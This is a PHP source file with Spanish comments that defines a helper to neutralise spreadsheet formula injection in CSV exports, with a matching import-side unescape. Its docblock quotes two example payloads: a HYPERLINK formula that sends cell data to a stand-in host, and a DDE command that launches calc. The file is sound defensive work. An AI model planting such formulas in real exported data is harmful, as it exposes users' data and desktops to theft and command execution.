<?php

namespace App\Support;

/**
 * Neutraliza las fórmulas de una celda antes de escribirla en un CSV (`SEC-7`).
 *
 * **El problema.** Para Excel, LibreOffice y Google Sheets, una celda que empieza
 * por `=`, `+`, `-`, `@`, un tabulador o un retorno de carro **es una fórmula**.
 * Y `name` sólo valida `string|max:300`, así que un producto llamado
 * `=HYPERLINK("http://malo/?"&A1,"ver")` —que además parece un enlace normal—
 * o `=cmd|'/c calc'!A0` entra sin problema por el formulario o por el import.
 *
 * **Lo que lo hace fácil de pasar por alto es que entra por un sitio y dispara
 * en otro.** Se planta importando un CSV, se queda dormido en la base, y se
 * ejecuta en el escritorio **del dueño** el día que pulsa *Exportar CSV* —que es
 * justamente la función que `MOD-7` prometió que devuelve lo que se ve en
 * pantalla—. El vector realista no es ni siquiera un `staff` hostil: es un CSV
 * de proveedor que alguien reenvía e importa.
 *
 * **Los números se quedan como están, y esa es la decisión que no se ve.** Un
 * `-50.00` de utilidad negativa en el reporte de `MOD-9` empieza por `-` pero no
 * es una fórmula: Excel lo lee como el número menos cincuenta. Prefijarlo lo
 * convertiría en texto, y una columna de dinero que Excel no puede sumar es una
 * exportación rota —que es lo que habría pasado con un `str_starts_with` a
 * secas—. Se prefija lo que empieza por uno de esos caracteres **y no es un
 * número**.
 *
 * **La comilla se quita al importar** (`sinPrefijo()`): sin eso, exportar y
 * reimportar renombraría el producto, y `MOD-12` dejó escrito que ese viaje tiene
 * que conservar el catálogo tal cual.
 */
final class CeldaCsv
{
    /**
     * Los que convierten una celda en fórmula. El tabulador y el retorno de
     * carro están porque algunas hojas los tragan como separador y dejan el
     * `=` de después al principio de la celda siguiente.
     */
    private const PELIGROSOS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Una celda lista para escribir.
     *
     * Devuelve el valor tal cual cuando no hay nada que hacer, así que el paso
     * por aquí no cambia ni el tipo ni el formato de lo que ya era seguro: los
     * decimales de un precio los sigue escribiendo `fputcsv` igual que antes.
     */
    public static function segura(mixed $valor): mixed
    {
        if (! is_string($valor) || $valor === '') {
            return $valor;
        }

        if (! in_array($valor[0], self::PELIGROSOS, true)) {
            return $valor;
        }

        if (self::esUnNumero($valor)) {
            return $valor;
        }

        return "'".$valor;
    }

    /**
     * Lo contrario, para el importador: quita la comilla que pusimos nosotros.
     *
     * Sólo si detrás viene uno de los caracteres peligrosos, que es la única
     * combinación que escribe `segura()`. Un nombre que empiece por comilla y
     * siga con una letra no se toca.
     */
    public static function sinPrefijo(string $valor): string
    {
        if (strlen($valor) < 2 || $valor[0] !== "'") {
            return $valor;
        }

        return in_array($valor[1], self::PELIGROSOS, true)
            ? substr($valor, 1)
            : $valor;
    }

    /**
     * Un número tal y como lo escribe esta aplicación: signo, dígitos y a lo
     * sumo un punto decimal. Nada de notación científica ni de separadores de
     * miles, que aquí no se generan y sí abrirían hueco a cosas raras.
     */
    private static function esUnNumero(string $valor): bool
    {
        return (bool) preg_match('/^[-+]?\d+(\.\d+)?$/', $valor);
    }
}
